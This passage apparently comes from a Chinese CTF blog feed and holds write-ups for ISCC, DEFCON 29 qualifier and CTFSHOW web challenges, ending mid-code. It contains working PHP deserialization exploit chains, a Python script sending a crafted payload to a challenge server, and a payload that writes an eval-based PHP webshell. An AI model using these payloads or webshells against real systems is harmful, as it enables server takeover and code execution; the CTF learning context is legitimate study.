class="string">&quot;空空如也就是我！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$wtf</span> = waf(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? <span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;试试就“逝世”!&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$goodshit</span> = @unserialize(<span class="variable">$wtf</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_unser_finished</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$status</span>, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc 和 exp 先贴着，坑不急着填，有空了一切好说</p><p><code>poc1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e=<span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;d=<span class="keyword">new</span> ISCC_Command();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b=<span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c=<span class="keyword">new</span> ISCC_Command();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="keyword">new</span> ISCC_Upload();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ISCC_Login();</span><br><span class="line"><span class="variable">$b</span>=urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%20&quot;</span>,str_replace(<span class="string">&quot;\\2A&quot;</span>,<span class="string">&quot;%5C2A&quot;</span>,str_replace(<span class="string">&quot;\\00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,urldecode(str_replace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&#x27;%5C2A&#x27;</span>,str_replace(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,<span class="variable">$b</span>)))))));</span><br><span class="line"><span class="comment">//var_dump(unserialize(urldecode(&#x27;O:10:&quot;ISCC_Login&quot;:3:&#123;S:1:&quot;b&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;S:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;S:1:&quot;e&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;)));</span></span><br></pre></td></tr></table></figure><p><code>poc2</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_Upload(),</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_ResetCMD(),</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_Command(),</span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span>=urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%20&quot;</span>,str_replace(<span class="string">&quot;\\2A&quot;</span>,<span class="string">&quot;%5C2A&quot;</span>,str_replace(<span class="string">&quot;\\00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,urldecode(str_replace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&#x27;%5C2A&#x27;</span>,str_replace(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,<span class="variable">$b</span>)))))));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39.96.91.106:7050/&#x27;</span> + <span class="string">&#x27;?%3F=O:10:&quot;ISCC_Login&quot;:3:&#123;S:1:&quot;b&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;S:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;S:1:&quot;e&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">f = (<span class="string">&quot;isccIsCciScc1scc&quot;</span>, <span class="string">&quot;Du1&quot;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;git.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">files = &#123;<span class="string">&quot;_SESSION&quot;</span>: f, <span class="string">&quot;iscc_file&quot;</span>: f1&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/05/8WQS5DsKVhRuN3X.png"></p><p>flag 出：<code>ISCC&#123;hjh_Y0u_sT1ll_D0nt_KNoW_wHiCH_ONe_is_true!:P&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_DEFCON_29_CTF_Qualifier_WP</title>
      <link href="2021/05/04/2021-DEFCON-29-CTF-Qualifier-WP/"/>
      <url>2021/05/04/2021-DEFCON-29-CTF-Qualifier-WP/</url>
      
        <content type="html"><![CDATA[<p>五一的时候也顺便看了看 DEFCON，后来 @狠狠 要我帮忙整理一下 pwn 题附件的时候才发现一件事，pwn 题一共有 15 道，再看看 web，比赛打到一半的时候才上一道，也是唯一一道，害。</p><p><img src="https://i.loli.net/2021/05/04/qsEpu2v6wOnTPL3.png"></p><p>跟着国外大佬的 wp 复现了一下。</p><h2 id="threefactooorx"><a href="#threefactooorx" class="headerlink" title="threefactooorx"></a>threefactooorx</h2><ul><li><p><a href="https://buer.haus/2021/05/03/defcon-29-ctf-qualifier-3factooorx-write-up/">https://buer.haus/2021/05/03/defcon-29-ctf-qualifier-3factooorx-write-up/</a></p></li><li><p><a href="https://graneed.hatenablog.com/entry/2021/05/03/091823">https://graneed.hatenablog.com/entry/2021/05/03/091823</a></p></li></ul><p>只是跟着复现了一下，改天再详细补一下（经典偷懒</p><p>主要考点是 js 混淆。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> p = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;3fa&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c1);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c2);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c3 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c3);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c4 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c4);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c5 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c5);</span><br><span class="line">  p.removeChild(c1);</span><br><span class="line">  p.removeChild(c2);</span><br><span class="line">  p.removeChild(c3);</span><br><span class="line"><span class="javascript">  c4.setAttribute(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,<span class="string">&quotquot;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;thirdfactooor&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;40&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;3fa&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>init();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提交即获得 flag：<code>000&#123;themorefactorsthebetter_butyouneedatleastthree&#125;</code></p><p><img src="https://i.loli.net/2021/05/04/tRiqf6LsFH9PMGe.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CTFSHOW_大牛杯_WP</title>
      <link href="2021/05/03/2021-CTFSHOW-%E5%A4%A7%E7%89%9B%E6%9D%AF-WP/"/>
      <url>2021/05/03/2021-CTFSHOW-%E5%A4%A7%E7%89%9B%E6%9D%AF-WP/</url>
      
        <content type="html"><![CDATA[<p>五一看了下 ctfshow 的大牛杯，web 题质量挺高的，有的题当时不会，现在复现一下吧。</p><h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h2><p>题目源码已经给出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-04-22 17:44:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-04-26 11:30:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;display_errors&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;allow_url_fopen&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;settings <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            ini_set(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;settings.inc&#x27;</span>, unserialize(<span class="keyword">$this</span>-&gt;params));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>在 <a href="https://www.php.net/manual/zh/var.configuration.php#ini.unserialize-callback-func">php manual</a> 里面有一个很有趣的变量配置，如果在反序列化的时候需要实例化一个未定义的类，可以设置回调函数以供调用，最关键的是这个配置是 PHP_IN_ALL 的，所以我们可以直接通过 ini_set 来设置</p><p><img src="https://i.loli.net/2021/05/03/PTqCp6XVEn7AQHv.png"></p><p>可以通过 spl_autoload 来自动加载未定义的类 settings，会默认加载当前目录下，以settings类名为文件名，php 或者 inc 为后缀的文件，这样就和 settings.inc 联系到了一起</p><p><img src="https://i.loli.net/2021/05/03/zYaB4UMjZGuyNWw.png"></p><p><img src="https://i.loli.net/2021/05/03/8ZX2MJj47DwySoq.png"></p><p>故我们可以先利用 array 反序列化去写一个🐎到 settings.inc 中，然后加载它。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">settings</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;unserialize_callback_func&#x27;</span>=&gt;<span class="string">&#x27;spl_autoload&#x27;</span></span><br><span class="line">        );</span><br><span class="line">         <span class="keyword">$this</span>-&gt;params=serialize(<span class="keyword">new</span> settings());  <span class="comment">/* 设置未定义类 settings */</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;params=serialize(<span class="keyword">array</span>(<span class="string">&quot;&lt;?php file_put_contents(&#x27;Du1.php&#x27;, &#x27;&lt;?php eval(\$_POST[Du1]);phpinfo();&#x27;);&quot;</span>));  <span class="comment">/* 写🐎 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> main()));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/03/iH3UbY7pvdxM6Ck.png"></p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>好家伙，这题还有非预期，利用 error_log、unserialize_callback_func 和 html_error 写🐎，改天复现一下吧。</p><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><p>这题当时师傅们都没看，运气好拿了个一血。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//flag in /</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_letter</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$letter_blacklist</span> = str_split(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$letter_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$letter_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_character</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$character_blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$character_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$character_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;tongtong xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = substr(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    check_letter(<span class="variable">$code</span>);</span><br><span class="line">    check_character(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span 